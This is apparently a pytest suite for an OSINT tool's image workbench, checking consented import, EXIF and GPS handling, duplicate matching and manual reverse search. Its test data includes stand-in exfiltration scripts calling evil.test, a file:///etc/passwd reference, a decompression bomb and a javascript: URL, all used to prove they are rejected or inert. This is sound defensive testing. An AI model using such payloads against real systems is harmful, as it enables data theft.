"""Image workbench (TP4). Acceptance: TP-11 (safe import, hash, EXIF), TP-12 (duplicate/altered matching with limits and a false-positive workflow),
TP-13 (reverse search is manual and never claimed as automated), TP-14 (no biometric identification anywhere), TP-21 (no execution or outbound calls)."""
from __future__ import annotations

import hashlib
import io
import re
from datetime import UTC, datetime, timedelta
from pathlib import Path

import httpx
import numpy as np
import pytest
from conftest import fake_dns, fake_resolver, make_handler
from osintcc.adapters.base import AdapterContext
from osintcc.db.models import AuditEvent, CaseMember, User
from osintcc.main import create_app
from osintcc.policy.ssrf import SafeHttp
from osintcc.profile import images
from PIL import Image

B = "/api/v1"


@pytest.fixture
async def api(settings, calls):
    http = SafeHttp(resolver=fake_resolver, transport=httpx.MockTransport(make_handler(calls)))
    app = create_app(settings, ctx_factory=lambda: AdapterContext(http=http, dns_query=fake_dns))
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://127.0.0.1") as c:
            c.headers["Authorization"] = f"Bearer {settings.session_token}"
            c.app = app
            yield c


def base_image(seed: int, size=(320, 240)) -> Image.Image:
    r = np.random.default_rng(seed)
    return Image.fromarray((r.random((12, 16)) * 255).astype("uint8")).resize(size, Image.Resampling.BICUBIC).convert("RGB")


def encode(im: Image.Image, fmt="PNG", **kw) -> bytes:
    b = io.BytesIO()
    im.save(b, fmt, **kw)
    return b.getvalue()


def jpeg_with_gps(seed=1) -> bytes:
    ex = Image.Exif()
    ex[0x010F], ex[0x0110], ex[0x0131] = "ExampleCam", "X100", "EditorPro 2"
    gps = ex.get_ifd(0x8825)
    gps[1], gps[2], gps[3], gps[4] = "N", (51.0, 30.0, 26.0), "W", (0.0, 7.0, 39.0)
    ex[0x8825] = gps
    sub = ex.get_ifd(0x8769)
    sub[0x9003], sub[0xA431] = "2024:05:01 10:20:30", "SERIAL-123456"
    ex[0x8769] = sub
    return encode(base_image(seed), "JPEG", exif=ex)


async def setup(api, classes=("image_analysis",), method="self_attestation"):
    cid = (await api.post(f"{B}/cases", json={"title": "Jane", "category": "people", "purpose": "self audit"})).json()["id"]
    sid = (await api.post(f"{B}/cases/{cid}/subjects", json={"display_name": "Jane"})).json()["id"]
    r = await api.post(f"{B}/subjects/{sid}/consent", json={"verification_method": method, "verifier": "Jane", "source_classes": list(classes), "permitted_purposes": ["audit"],
                                                            "expires_at": (datetime.now(UTC) + timedelta(days=30)).isoformat()})
    assert r.status_code == 201, r.text
    return cid, sid


async def upload(api, sid, data: bytes, name="photo.jpg", **q):
    params = {"filename": name, "confirm_rights": "true", **q}
    return await api.post(f"{B}/subjects/{sid}/images", params=params, content=data)


# ---- TP-11 ---------------------------------------------------------------------------------------------------------------------------
async def test_tp11_import_stores_hash_and_extracts_supported_exif(api, calls):
    cid, sid = await setup(api)
    data = jpeg_with_gps()
    r = await upload(api, sid, data)
    assert r.status_code == 201, r.text
    j = r.json()
    assert j["sha256"] == hashlib.sha256(data).hexdigest() and j["created"] is True and j["format"] == "JPEG" and (j["width"], j["height"]) == (320, 240)
    assert j["exif"]["Make"] == "ExampleCam" and j["exif"]["Model"] == "X100" and j["exif"]["DateTimeOriginal"] == "2024:05:01 10:20:30"
    assert j["has_gps"] and j["gps"]["precision"] == "exact" and abs(j["gps"]["lat"] - 51.5072) < 1e-3 and abs(j["gps"]["lon"] + 0.1275) < 1e-4
    assert "metadata can be missing, removed or forged" in j["metadata_caveat"].lower()
    ev = (await api.get(f"{B}/cases/{cid}/evidence")).json()["items"]
    assert any(e["sha256"] == j["sha256"] for e in ev)                                  # an ordinary evidence object, vault-hashed
    again = await upload(api, sid, data)
    assert again.json()["created"] is False and again.json()["id"] == j["id"]           # same file, same subject: no duplicate record
    assert calls == []


async def test_tp11_requires_rights_confirmation_and_live_authorization(api):
    _cid, sid = await setup(api)
    r = await api.post(f"{B}/subjects/{sid}/images", params={"filename": "a.png"}, content=encode(base_image(1)))
    assert r.status_code == 422 and r.json()["code"] == "rights_required"
    cid2 = (await api.post(f"{B}/cases", json={"title": "x", "category": "people", "purpose": "p"})).json()["id"]
    sid2 = (await api.post(f"{B}/cases/{cid2}/subjects", json={"display_name": "No consent"})).json()["id"]
    r = await upload(api, sid2, encode(base_image(1)), "a.png")
    assert r.status_code == 403 and r.json()["code"] == "consent_required"


@pytest.mark.parametrize("name,blob", [
    ("svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    ("html", b"<!DOCTYPE html><html><body><script>fetch('http://evil.test')</script></body></html>"),
    ("pdf", b"%PDF-1.7\n1 0 obj\n<< /OpenAction << /S /JavaScript >> >>"),
    ("exe", b"MZ\x90\x00" + b"\x00" * 200),
    ("zip", b"PK\x03\x04" + b"\x00" * 100),
    ("text", b"just some text pretending to be a picture"),
    ("truncated", encode(base_image(2))[:300]),
    ("empty", b""),
])
async def test_tp11_unsafe_or_invalid_files_are_rejected(api, calls, name, blob):
    _cid, sid = await setup(api)
    r = await upload(api, sid, blob, f"{name}.png")
    assert r.status_code == 422 and r.json()["code"] in ("unsafe_file", "invalid_image", "empty_file", "unsupported_format"), (name, r.text)
    assert (await api.get(f"{B}/subjects/{sid}/images")).json()["total"] == 0
    assert calls == []


async def test_tp11_decompression_bomb_is_refused(api):
    _cid, sid = await setup(api)
    bomb = encode(Image.new("1", (30000, 30000)))       # a few KB on disk, 900 million pixels when decoded
    assert len(bomb) < 2_000_000
    r = await upload(api, sid, bomb, "bomb.png")
    assert r.status_code == 422 and r.json()["code"] in ("invalid_image", "too_large")


# ---- TP-21: nothing embedded is executed, fetched or served --------------------------------------------------------------------------------
async def test_tp21_polyglot_is_flagged_never_served_and_makes_no_requests(api, calls):
    _cid, sid = await setup(api)
    payload = b"<script>fetch('http://evil.test/steal')</script>"
    png = encode(base_image(3)) + payload
    r = await upload(api, sid, png, "polyglot.png")
    assert r.status_code == 201
    j = r.json()
    assert any("follow the end of the image data" in n for n in j["notes"])
    thumb = await api.get(f"{B}/subjects/{sid}/images/{j['id']}/thumbnail")
    assert thumb.status_code == 200 and thumb.headers["content-type"] == "image/png" and thumb.content[:8] == b"\x89PNG\r\n\x1a\n"
    assert payload not in thumb.content and Image.open(io.BytesIO(thumb.content)).getexif() == Image.Exif()
    assert calls == []                                                                  # no outbound request was made while processing


async def test_tp21_urls_in_metadata_are_data_not_actions(api, calls):
    _cid, sid = await setup(api)
    ex = Image.Exif()
    ex[0x010E] = "see http://evil.test/exfil?x=1 and file:///etc/passwd"
    data = encode(base_image(4), "JPEG", exif=ex)
    r = await upload(api, sid, data)
    assert r.status_code == 201 and calls == []


# ---- GPS privacy -------------------------------------------------------------------------------------------------------------------------
async def test_precise_gps_is_for_editors_and_owners_only_and_viewing_is_audited(api):
    cid, sid = await setup(api)
    iid = (await upload(api, sid, jpeg_with_gps())).json()["id"]
    st = api.app.state.core
    with st.sm() as db:
        db.add(User(id="v1", display_name="viewer"))
        db.flush()
        db.add(CaseMember(case_id=cid, user_id="v1", access_role="viewer"))
        db.commit()
    st.tokens["viewer-token"] = "v1"
    v = httpx.AsyncClient(transport=httpx.ASGITransport(app=api.app), base_url="http://127.0.0.1", headers={"Authorization": "Bearer viewer-token"})
    j = (await v.get(f"{B}/subjects/{sid}/images/{iid}")).json()
    assert j["gps"]["precision"].startswith("coarse") and j["gps"]["lat"] == 51.5 and j["gps"]["lon"] == -0.1
    assert "BodySerialNumber" not in j["exif"]                                         # device serial withheld from low-privilege views
    owner = (await api.get(f"{B}/subjects/{sid}/images/{iid}")).json()
    assert owner["gps"]["precision"] == "exact" and owner["exif"]["BodySerialNumber"] == "SERIAL-123456"
    with st.sm() as db:
        assert db.query(AuditEvent).filter(AuditEvent.action == "image.gps_view").count() == 1


# ---- TP-12 ---------------------------------------------------------------------------------------------------------------------------
async def test_tp12_exact_resized_cropped_and_unrelated_images(api):
    cid, sid = await setup(api)
    sid2 = (await api.post(f"{B}/cases/{cid}/subjects", json={"display_name": "Other subject"})).json()["id"]
    await api.post(f"{B}/subjects/{sid2}/consent", json={"verification_method": "self_attestation", "verifier": "x", "source_classes": ["image_analysis"],
                                                         "permitted_purposes": [], "expires_at": (datetime.now(UTC) + timedelta(days=5)).isoformat()})
    orig = base_image(1)
    a = (await upload(api, sid, encode(orig), "orig.png")).json()
    resized = (await upload(api, sid2, encode(orig.resize((160, 120)), "JPEG", quality=70), "small.jpg")).json()
    crop = (await upload(api, sid2, encode(orig.crop((20, 15, 260, 195)), "JPEG"), "crop.jpg")).json()
    other = (await upload(api, sid2, encode(base_image(9)), "other.png")).json()
    exact = (await upload(api, sid2, encode(orig), "copy.png")).json()
    m = (await api.get(f"{B}/subjects/{sid2}/images/{exact['id']}/matches")).json()
    by_other = {x["other_asset_id"]: x for x in m["items"]}
    assert by_other[a["id"]]["type"] == "exact_duplicate" and by_other[a["id"]]["score"] == 1.0
    m = (await api.get(f"{B}/subjects/{sid2}/images/{resized['id']}/matches")).json()
    kinds = {x["other_asset_id"]: x["type"] for x in m["items"]}
    assert kinds[a["id"]] in ("near_duplicate", "exact_duplicate") and other["id"] not in kinds              # recompressed + resized copy found, unrelated image not
    m = (await api.get(f"{B}/subjects/{sid2}/images/{crop['id']}/matches")).json()
    kinds = {x["other_asset_id"]: x["type"] for x in m["items"]}
    assert kinds[a["id"]] == "possible_crop" and other["id"] not in kinds
    assert "do not find rotated, mirrored" in m["limits"] and "Every match needs a human decision" in m["limits"]
    assert all(x["state"] == "candidate" for x in m["items"])                                              # nothing is auto-confirmed
    # an unrelated image never matches anything
    m = (await api.get(f"{B}/subjects/{sid2}/images/{other['id']}/matches")).json()
    assert [x for x in m["items"] if x["other_asset_id"] != other["id"] and x["type"] != "possible_crop"] == []


async def test_tp12_thresholds_are_tunable_and_false_positives_can_be_rejected_for_good(api):
    _cid, sid = await setup(api)
    orig = base_image(1)
    a = (await upload(api, sid, encode(orig), "orig.png")).json()
    r = np.random.default_rng(5)
    noisy = Image.fromarray(np.clip(np.asarray(orig, dtype=np.int16) + r.integers(-60, 60, (240, 320, 3)), 0, 255).astype("uint8"))
    b = (await upload(api, sid, encode(noisy, "JPEG", quality=30), "noisy.jpg")).json()
    d = images.hamming(a["hashes"]["phash"], b["hashes"]["phash"])
    ms = (await api.get(f"{B}/subjects/{sid}/images/{b['id']}/matches")).json()["items"]
    assert d > 0                                                                          # the variant is not trivially identical
    loose = [x for x in ms if x["other_asset_id"] == a["id"]]
    assert loose, "default thresholds should flag the degraded copy"
    # review: reject it as a false positive, then rematch with looser limits; the decision sticks
    mid = loose[0]["id"]
    r = await api.post(f"{B}/subjects/{sid}/images/{b['id']}/review", json={"match_id": mid, "state": "rejected", "note": "different photo, same scene"})
    assert r.status_code == 200 and r.json()["state"] == "rejected" and r.json()["reviewer"]
    bad = await api.post(f"{B}/subjects/{sid}/images/{b['id']}/review", json={"match_id": mid, "state": "rejected", "note": " "})
    assert bad.status_code in (422,)
    rm = await api.post(f"{B}/subjects/{sid}/images/{b['id']}/rematch", json={"phash_max": 20, "dhash_max": 24, "crop_max": 16})
    assert rm.status_code == 200 and rm.json()["thresholds"]["phash_max"] == 20
    after = next(x for x in (await api.get(f"{B}/subjects/{sid}/images/{b['id']}/matches")).json()["items"] if x["id"] == mid)
    assert after["state"] == "rejected"
    over = await api.post(f"{B}/subjects/{sid}/images/{b['id']}/rematch", json={"phash_max": 99})
    assert over.status_code == 422                                                           # thresholds are bounded


# ---- TP-13 ---------------------------------------------------------------------------------------------------------------------------
async def test_tp13_reverse_search_is_manual_guidance_and_never_claims_automation(api, calls):
    _cid, sid = await setup(api, classes=("image_analysis", "reverse_image"), method="email_confirmation")
    iid = (await upload(api, sid, encode(base_image(1)), "p.png", ownership="public", source_url="https://example.org/photos/jane.png")).json()["id"]
    g = (await api.get(f"{B}/subjects/{sid}/images/{iid}/reverse-search")).json()
    assert {p["id"] for p in g["providers"]} == {"google_lens", "bing_visual", "tineye"}
    assert all("no unattended calls" in p["automation"] for p in g["providers"])
    assert all(p["link"] and "example.org" in p["link"] for p in g["providers"]) and g["public_url_known"]
    assert any("does not identify the person" in s for s in g["steps"]) and "Do not infer who a person is" in g["limits"]
    assert calls == []                                                                         # guidance builds links only; nothing is sent
    # recording a result a person found by hand
    r = await api.post(f"{B}/subjects/{sid}/images/{iid}/matches", json={"provider": "tineye", "matched_url": "https://news.example/story/42", "note": "found via TinEye on 2026-01-02"})
    assert r.status_code == 201
    j = r.json()
    assert j["type"] == "provider_page" and j["state"] == "candidate" and j["provider"] == "tineye" and j["matched_url"] == "https://news.example/story/42"
    assert any(e["id"] for e in j["evidence"]) and "do not identify anyone" in j["confidence_note"] and j["observed_at"]
    for bad in ("javascript:alert(1)", "ftp://x.test/a", "https://user:pw@x.test/a", "not a url"):
        assert (await api.post(f"{B}/subjects/{sid}/images/{iid}/matches", json={"provider": "other", "matched_url": bad, "note": ""})).status_code == 422
    assert calls == []


async def test_tp13_no_links_without_strong_authorization_and_private_images_get_no_link(api):
    _cid, sid = await setup(api)                                  # image_analysis only; reverse_image is not authorized
    iid = (await upload(api, sid, encode(base_image(1)), "p.png", ownership="public", source_url="https://example.org/p.png")).json()["id"]
    g = (await api.get(f"{B}/subjects/{sid}/images/{iid}/reverse-search")).json()
    assert g["authorization"]["allowed"] is False and all(p["link"] is None for p in g["providers"])
    r = await api.post(f"{B}/subjects/{sid}/images/{iid}/matches", json={"provider": "tineye", "matched_url": "https://news.example/a", "note": ""})
    assert r.status_code == 403
    weak = await api.post(f"{B}/subjects/{sid}/consent", json={"verification_method": "self_attestation", "verifier": "Jane", "source_classes": ["reverse_image"],
                                                               "permitted_purposes": [], "expires_at": (datetime.now(UTC) + timedelta(days=5)).isoformat()})
    assert weak.status_code == 422 and weak.json()["code"] == "verification_too_weak"
    _cid2, sid2 = await setup(api, classes=("image_analysis", "reverse_image"), method="email_confirmation")
    own = (await upload(api, sid2, encode(base_image(2)), "mine.png", ownership="user_owned")).json()["id"]
    g = (await api.get(f"{B}/subjects/{sid2}/images/{own}/reverse-search")).json()
    assert not g["public_url_known"] and all(p["link"] is None and "never uploads it for you" in p["how"] for p in g["providers"])


# ---- TP-14 ---------------------------------------------------------------------------------------------------------------------------
def test_tp14_no_biometric_identification_exists():
    root = Path(__file__).resolve().parents[2]
    banned_imports = re.compile(r"^\s*(?:from|import)\s+(face_recognition|deepface|dlib|insightface|mediapipe|facenet|cv2|torch|tensorflow|onnxruntime)\b", re.MULTILINE)
    banned_names = re.compile(r"(face_?(?:recogn|embed|match|detect|encod|verify)|facial|biometric|identify_person|who_is|reverse_face)", re.IGNORECASE)
    offenders = []
    for p in (root / "backend" / "osintcc").rglob("*.py"):
        text = p.read_text(encoding="utf8")
        code = "\n".join(line for line in text.splitlines() if not line.lstrip().startswith(("#", '"""')))
        if banned_imports.search(text):
            offenders.append((p.name, "import"))
        for m in banned_names.finditer(code):
            line = code[max(0, code.rfind("\n", 0, m.start())):code.find("\n", m.end())]
            if not re.search(r"\b(no|not|never|without|nor|does not|do not|cannot)\b", line, re.IGNORECASE) and "docstring" not in line:
                offenders.append((p.name, m.group(0)))
    assert offenders == [], offenders
    deps = (root / "pyproject.toml").read_text(encoding="utf8").lower()
    assert not any(w in deps for w in ("opencv", "face", "dlib", "torch", "tensorflow", "onnx"))


async def test_tp14_no_route_identifies_people(api):
    paths = [r.path for r in api.app.routes if hasattr(r, "path")]
    assert not [p for p in paths if re.search(r"face|biometric|identify|who-is|recogni", p, re.IGNORECASE)], paths
